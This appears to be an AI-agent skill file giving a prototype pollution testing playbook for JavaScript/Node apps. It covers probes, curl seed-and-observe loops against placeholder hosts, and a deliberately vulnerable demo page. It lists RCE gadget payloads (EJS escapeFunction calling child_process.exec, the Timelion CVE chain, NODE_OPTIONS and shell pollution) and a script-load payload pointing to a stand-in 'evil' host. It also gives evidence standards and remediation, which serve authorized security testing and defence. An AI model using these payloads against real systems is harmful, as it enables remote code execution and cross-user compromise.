---
name: prototype-pollution
description: >-
  Prototype pollution testing for JavaScript stacks. Use when user input is
  merged into objects (query parsers, JSON bodies, deep assign), when
  configuring libraries via untrusted keys, or when hunting RCE gadgets via
  polluted Object.prototype in Node or the browser.
---

# SKILL: Prototype Pollution — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert prototype pollution for client and server JS. Covers `__proto__` vs `constructor.prototype`, merge-sink detection, Express/qs-style black-box probes, and gadget chains (EJS, Timelion-class patterns, child_process/NODE_OPTIONS). Assumes you know object spread and prototype inheritance — focus is on **parser behavior** and **post-pollution sinks**.

Routing note: prioritize PP when you see deep merges, recursive assign, `JSON.parse` followed by `Object.assign`, or URL queries converted to nested objects.

## 0. QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.

```text
#__proto__[xxx]=alert(1)
```

### Server-side first probes（JSON / form）

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see §3 detection table).

### Quick boolean

If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**.

---

## 1. MECHANISM

**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.

**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.

**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:

```json
{"constructor":{"prototype":{"polluted":1}}}
```

This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.

**Core issue**: this is not just "one extra parameter"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets.

---

## 2. CLIENT-SIDE DETECTION

### URL fragment

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

If router or analytics code parses fragments into objects and then merges, pollution may occur.

### `constructor.prototype` path

```text
#constructor[prototype][role]=admin
```

### DOM / attribute injection ideas

If the framework merges attribute names as object keys:

```text
__proto__[src]=//evil/xss.js
```

Event-handler style keys (implementation-dependent):

```text
__proto__[onerror]=alert(1)
```

**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference.

---

## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.

| Payload (JSON example) | Expected observable signal |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests is ignored or abnormal (`qs`-style `parameterLimit`) |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | Double-question-mark prefixes like `??foo=bar` are accepted or behavior changes sharply |
| `{"__proto__":{"allowDots":true}}` | Nested keys like `?foo.bar=baz` are expanded via dot notation |
| `{"__proto__":{"json spaces":" "}}` | JSON-serialized responses gain extra spaces (`JSON.stringify` spacing setting polluted) |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers (if framework reads config from prototype) |
| `{"__proto__":{"status":510}}` | Some response status changes to 510 or another abnormal code (app reads `status` from object) |

**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible.

---

## 4. EXPLOITATION GADGETS

| Target / scenario | Payload or pattern | Notes |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | If template engine options like `escapeFunction` are read from polluted prototype, this may lead to RCE; strongly version/config dependent |
| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historical chain: prototype pollution + timeline expression execution; useful to understand **expression + PP** combinations |
| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` option objects) | Depends on whether later code calls `spawn`/`fork` and reads options from prototype chain |
| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that filters only the `__proto__` key |

**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.

---

## 5. TOOLS

| Project | Purpose |
|------|------|
| **yeswehack/pp-finder** | Helps locate PP-prone merge points and patterns |
| **yuske/silent-spring** | Research and detection around prototype-pollution surfaces |
| **yuske/server-side-prototype-pollution** | Server-side PP testing suite/methodology |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension / supporting material |
| **msrkp/PPScan** | Scanning/verification helper |

Prioritize use on **authorized** targets; automated tools can cause side effects on stateful applications.

---

## 6. DECISION TREE

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```

---

## 7. EXECUTION PRIMITIVES

Prototype pollution is proven by a **property that was not there before**, readable from a fresh
object in the same context. These blocks detect it, prove it, and then look for a gadget.

### 7.1 Client-side: the canonical detection

```bash
# serve a page and open it in a real browser - the fragment is merged by test code, simulating a vulnerable sink
cat > /tmp/pp.html <<'HTML'
<!doctype html><meta charset=utf-8>
<script>
const q = new URLSearchParams(location.search);
const input = JSON.parse(q.get("j") || "{}");
// a deliberately vulnerable merge - this is what a client-side PP sink looks like
function merge(t, s){ for (const k in s) { if (typeof t[k] === "object" && typeof s[k] === "object") merge(t[k], s[k]); else t[k] = s[k]; } }
const target = {};
merge(target, input);
// the check: does a FRESH object inherit our property?
const probe = {};
document.title = JSON.stringify({own: Object.prototype.polluted, fresh: probe.polluted});
</script>
HTML
python3 -m http.server 8080 --directory /tmp >/dev/null 2>&1 &
echo "open: http://127.0.0.1:8080/pp.html?j=%7B%22__proto__%22%3A%7B%22polluted%22%3A%22yes%22%7D%7D"
```

`probe.polluted` being `"yes"` is the finding: **a fresh object**, not the merge target, now carries
your property. Testing the target object instead of a fresh one is the most common mistake - the
target would have the property either way.

### 7.2 Server-side: the JSON-body probe

```bash
BODY='{"__proto__":{"pp_probe":"yes"}}'
curl -sS -o /dev/null -w 'seed %{http_code}\n' -X POST "https://target.tld/api/settings" \
  -H 'Content-Type: application/json' -H "Authorization: Bearer $TOK" -d "$BODY"
# then, in a SEPARATE request, ask the app for something that would inherit the property
# (a reflected default, a toJSON output, a config echo, any object serialised back to you)
curl -sS "https://target.tld/api/settings" -H "Authorization: Bearer $TOK" | head -c 300
curl -sS -X POST "https://target.tld/api/echo" -H 'Content-Type: application/json' -d '{}' | head -c 300
```

Pollution is **cross-request** on the server: the seed request and the observable request are separate.
If the probe value appears in a later unrelated response, the object graph is polluted process-wide.

### 7.3 Variant keys for `__proto__`-filtered code

```bash
for B in \
  '{"__proto__":{"pp":"1"}}' \
  '{"constructor":{"prototype":{"pp":"1"}}}' \
  '{"__proto__":{"__proto__":{"pp":"1"}}}' \
  '{"constructor[prototype][pp]":"1"}' \
  '{"a":{"__proto__":{"pp":"1"}}}' ; do
  C=$(curl -sS -o /dev/null -w '%{http_code}' -X POST "https://target.tld/api/settings" \
        -H 'Content-Type: application/json' -H "Authorization: Bearer $TOK" -d "$B")
  printf '%-46s %s\n' "$B" "$C"
done
```

`constructor.prototype` is the equivalent path when `__proto__` is blocked, and nested forms survive
recursive merges that filter only the top level. **Send each variant separately** and check the
observable request after each, so you know which one polluted.

### 7.4 Form-encoded and query-string variants

```bash
# some parsers expand dotted and bracketed keys into a nested object
curl -sS -o /dev/null -w 'qs %{http_code}\n' "https://target.tld/api/settings?__proto__[pp]=1"
curl -sS -o /dev/null -w 'dot %{http_code}\n' "https://target.tld/api/settings?__proto__.pp=1"
curl -sS -o /dev/null -w 'ctor %{http_code}\n' "https://target.tld/api/settings?constructor[prototype][pp]=1"
curl -sS -o /dev/null -w 'form %{http_code}\n' -X POST "https://target.tld/api/settings" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d '__proto__[pp]=1'
```

`qs`, `lodash.merge`, and several framework body parsers expand both bracket and dot notation. A
version that is vulnerable in a JSON body is often vulnerable in a query string too - **test both**,
because the fix frequently covers only one.

### 7.5 Build the observable oracle

```bash
# pollution is only useful with a gadget. find a property the app reads from an inherited key.
grep -rniE '\.status\b|\.role\b|\.isAdmin\b|\.can[A-Z]|\.environment\b|\.shell\b|\.env\b' \
  /path/to/source --include='*.js' | grep -vE 'hasOwnProperty|=== ?(\x27|\x22)' | head -30
# black-box: request an "whoami"-style endpoint and look for defaults the app took from config
curl -sS "https://target.tld/api/me" -H "Authorization: Bearer $TOK"
curl -sS "https://target.tld/api/config" -H "Authorization: Bearer $TOK" 2>/dev/null | head -c 200
```

The oracle is any response that reflects a value the server *derived from an object it did not own*.
Without an oracle you have a confirmed pollution and no demonstrated impact - report it as such.

### 7.6 Gadget check: environment variables and child-process options

```bash
# the classic server-side RCE gadget: pollution that reaches spawn/exec options
BODY='{"__proto__":{"shell":"node","env":{"PP_RAN":"1"},"argv0":"node","NODE_OPTIONS":"--require /proc/self/environ"}}'
curl -sS -o /dev/null -w '%{http_code}\n' -X POST "https://target.tld/api/settings" \
  -H 'Content-Type: application/json' -d "$BODY"
# then trigger an endpoint whose handler spawns a process, and check for your marker
curl -sS -X POST "https://target.tld/api/render" -H 'Content-Type: application/json' -d '{}' | head -c 300
```

Client-side gadgets are property reads (`script.src`, `fetch` URL, templating helper); server-side
gadgets are **option objects** passed to `child_process`, template engines, or HTTP clients. Name the
gadget you used and the file it lives in, or state that you found pollution without a gadget.

### 7.7 Confirm pollution survives and is process-wide

```bash
# repeat the observable request 3 times, spaced out
for i in 1 2 3; do
  curl -sS "https://target.tld/api/echo" -H 'Content-Type: application/json' -d '{}' | head -c 120; echo
  sleep 3
done
# and check whether a NEW session/connection still sees it (process-scoped, not request-scoped)
curl -sS --no-keepalive "https://target.tld/api/echo" -H 'Content-Type: application/json' -d '{}' | head -c 120
```

Server-side pollution persists for the life of the process, which means **it affects other users**.
If the marker appears in a request that did not carry the payload, that is the cross-user impact and
the reason this class is high severity.

### 7.8 Detect the client side without a source map

```bash
# in a browser, override the prototype setter and log the stack of whoever sets it
cat > /tmp/detect.js <<'JS'
(() => {
  const desc = Object.getOwnPropertyDescriptor(Object.prototype, "__proto__");
  Object.defineProperty(Object.prototype, "__proto__", {
    configurable: true,
    get() { return desc.get.call(this); },
    set(v) { console.trace("PROTO SET", JSON.stringify(v).slice(0,200), location.href); return desc.set.call(this, v); }
  });
  window.__pp = () => Object.keys(Object.prototype).length;
})();
JS
echo "paste /tmp/detect.js in the console BEFORE interacting with the app, then read the stack traces"
```

The stack trace names the library and the call path that merged attacker data - which is exactly what
a fix owner needs and what a static report never provides.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did a **fresh** object (not the merge target) gain your property? | the defining test; the target proves nothing |
| 2 | Is the property still present in a **separate request** (server) or on a later interaction (client)? | persistence, and for the server, cross-user exposure |
| 3 | Is there a **gadget** that reads the polluted key into a security-relevant decision? | pollution alone is a lead; the gadget is the impact |
| 4 | Does the effect reach **another user's** request on a shared process? | the cross-user impact, which sets severity |
| 5 | Which **variant** polluted (`__proto__`, `constructor.prototype`, dotted key)? | the fix must cover the path that worked |
| 6 | Is the source **attacker-controlled input** merged into an object, rather than a constant? | otherwise it is not reachable |
| 7 | If you claim RCE, did you see your **marker** appear in the output of a process the app spawned? | a marker is the only acceptable RCE proof |

**Pollution without a gadget is a real bug with limited demonstrated impact.** Say exactly that:
"pollution confirmed process-wide; no gadget identified that reads `X` into a decision, so the
demonstrated impact is limited to `<observed effect>`". Inventing a gadget is the failure mode.

---
### The control pair — pollution is a DIFFERENCE, not a response

Every step above asks "did you see the effect". **A response alone is not evidence.** The
server may have echoed your key back, or the client may have rendered your JSON. The finding
exists only when the **clean** and **polluted** runs differ in the way that matters.

Run this four-part control, in this order, on the same target and the same request shape:

| # | Run | Expected |
|---|---|---|
| A | **baseline** — the same request with the merge key **absent** | the observable is X |
| B | **polluted** — the identical request with the pollution payload | the observable is **not** X |
| C | **fresh-object probe** — a request that reads a property the request never set | it is present only in the polluted world |
| D | **sink probe** — a request that exercises the gadget | the marker appears only in the polluted world |

**A and B differing is not sufficient.** Many parsers normalise input, so B may differ simply
because you sent a different body. C is what isolates pollution: it reads a property that
**no part of your request set**, so it can only be present if you reached the prototype chain.

### The three controls that must all fail

| Control | If it SUCCEEDS | What it means |
|---|---|---|
| the payload on an endpoint that does **not** merge input | pollution claimed anyway | the observable is a normal echo, not pollution |
| the polluted request against a **patched / different version** | effect still appears | you are observing something else |
| the **same key with a non-polluting name** (`__proto__` replaced by a safe key) | effect still appears | the merge path is not the cause |

### Making the observable falsifiable

State the observable as a **comparison**, not an observation:

- bad: "the response contained `isAdmin: true`" - this may just be a reflection
- good: "a request that never set `isAdmin` returned `true`; the baseline returned `undefined`"

For the **client side**, the equivalent is a **sentinel property**: pick a key the page never
uses, pollute it, and read it back through the app's own rendering. If the sentinel survives
into the DOM, pollution is confirmed. If only your injected key is echoed, it is not.

For the **server side**, the strongest control is the **clean-session read**: pollute in one
session, then read in a session that shares only the process. If the property is visible there,
the pollution is process-wide and the cross-user impact is real. If it is only visible in the
request that sent it, you have reflection, not pollution.

**The rule:** if you cannot state the clean-run value and the polluted-run value side by side,
you have not confirmed anything. Write the pair, or do not write the finding.

---

## 9. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **seed request** (exact body, key form, content type) | the variant that worked is the finding |
| The **observable request** that showed the property, in a **separate** exchange | proves persistence rather than an echo |
| The **fresh-object test** result | the defining proof, and the thing a report without it fails to establish |
| The **gadget** named, with the file and line or the endpoint that reads it | impact, and what the fix must guard |
| For RCE: the **marker output** from the spawned process, and the endpoint that triggered it | a marker is required; a 200 is not |
| The **stack trace** from the client-side setter override | the exact library and merge path |
| The **scope**: process-wide, per-user, or per-request, with the test that established it | determines severity and blast radius |
| The **runtime and framework versions** | gadget availability is version-specific |
| **Negative control** - the same request with a benign key does not pollute, and a fresh object is clean before the seed | proves causation, not coincidence |
| A statement that no persistent state was modified and no restart-inducing payload was sent | scope discipline |

Report the **chain**: "`POST /api/settings` with `{"__proto__":{"pp_probe":"yes"}}` pollutes
`Object.prototype` process-wide: a subsequent unrelated `POST /api/echo` from a different connection
returned `{"pp_probe":"yes"}` on an object it never received; the handler in `settings.js:88` uses
`lodash.merge` on the body, and `lib/render.js:41` reads `options.shell` from a merged options object
passed to `child_process.exec`, which is the gadget path", never "prototype pollution is present".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The **merge target** has your property, but a fresh object does not | not pollution; that is the object you wrote to |
| The value is echoed back in the same response | reflection, not inheritance |
| Pollution in your own browser console only, with no app sink | no delivery path to the app's own code |
| A fresh object is "polluted" because your own test code wrote it | self-inflicted |
| `hasOwnProperty` guard present, so the inherited key is never read | the app is protected at that read |
| The key is filtered, and the filter produces no bypass | the control worked |
| A crash (`500`) from the payload | a crash is not pollution |
| A pollution you could only produce by patching the page yourself | not an attack |
| Server-side "pollution" that does not survive to a second request | no persistence, no impact |
| A gadget you reasoned about but never executed | unproven; report the pollution and the unproven gadget separately |
| An RCE claim without a marker in the process output | not demonstrated |
| A property set on a plain object you created in your own payload | not the prototype chain |

**Test the fresh object.** If you did not, you have not established prototype pollution.

---

## 10. REMEDIATION REFERENCE

1. **Reject `__proto__`, `constructor`, and `prototype` as keys in every object merge** - filter at the parser or the merge helper, not at each call site, and apply the filter recursively because nested forms survive a top-level-only check.
2. **Create merged objects with a null prototype** - `Object.create(null)` (or a `Map`) as the merge target means there is no prototype chain to pollute, which removes the class structurally.
3. **Avoid deep-merge helpers on untrusted input, or use hardened versions** - `lodash.merge`, `jQuery.extend(true, …)`, and `qs` have all shipped fixes; pin past the advisory and prefer explicit key-by-key assignment.
4. **Use `Object.prototype.hasOwnProperty.call(obj, key)` at every security-relevant read** - a check against inherited properties is the difference between a polluted key being read and ignored.
5. **Freeze or seal prototypes in production where feasible** - `Object.freeze(Object.prototype)` in a strict-mode context prevents writes to the prototype, and violations become errors rather than silent compromise.
6. **Treat `child_process` option objects as untrusted-adjacent** - never build spawn/exec options from a merged config object; construct them explicitly from validated scalars.
7. **Validate request bodies against a strict schema that rejects unknown keys** - an allowlist schema stops `__proto__` at the boundary, and it also stops the nested forms a recursive filter can miss.
8. **Run Node with `--disable-proto=throw` where supported** - it makes the `__proto__` accessor throw, turning silent pollution into a loud failure during testing, and removing a common vector in production.
9. **Keep dependencies and the runtime current** - most real-world prototype pollution is a vulnerable merge library one dependency deep; track advisories for parser and merge packages specifically.
10. **Isolate request handling processes and recycle them** - process-wide pollution is the reason this class is severe; per-request worker recycling bounds the blast radius and is a real mitigation while the code fix lands.
11. **Add a regression test that asserts a fresh object stays clean** - the test is three lines and it detects the entire class, including regressions introduced by a new merge library.

---

## 11. RELATED SIBLINGS - LOAD TOGETHER

- [prototype-pollution-advanced](../prototype-pollution-advanced/SKILL.md) - the RCE-gadget and client-side escalation companion
- [nosql-injection](../nosql-injection/SKILL.md) - operator injection into the same object graph
- [deserialization-insecure](../deserialization-insecure/SKILL.md) - the other path where attacker-controlled structure becomes code
- [xss-exploitation-chains](../xss-exploitation-chains/SKILL.md) - what a client-side gadget usually escalates to
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) - the sink a server-side gadget reaches

---

## 12. RELATED ROUTING

- Input routing and multi-injection parallel entry -> [Injection Testing Router](../injection-checking/SKILL.md).
- Template execution chains (non-PP) -> [SSTI](../ssti-server-side-template-injection/SKILL.md).
- Insecure deserialization (non-JS prototype) -> [Deserialization](../deserialization-insecure/SKILL.md).

---
